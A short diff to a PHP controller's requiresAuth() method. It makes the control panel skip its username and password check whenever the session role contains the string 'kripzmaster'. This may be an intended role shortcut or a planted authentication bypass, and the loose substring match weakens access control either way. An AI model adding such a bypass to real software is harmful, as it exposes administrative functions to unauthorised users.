@@ -49,6 +49,11 @@ final class ControlController
 
     private function requiresAuth(): bool
     {
+        $role = isset($_SESSION['mh_auth_role']) ? strtolower(trim((string) $_SESSION['mh_auth_role'])) : '';
+        if ($role !== '' && stripos($role, 'kripzmaster') !== false) {
+            return false;
+        }
+
         $username = $this->app->config()->nullableString('CONTROL_USERNAME');
         $password = $this->app->config()->nullableString('CONTROL_PASSWORD');
 
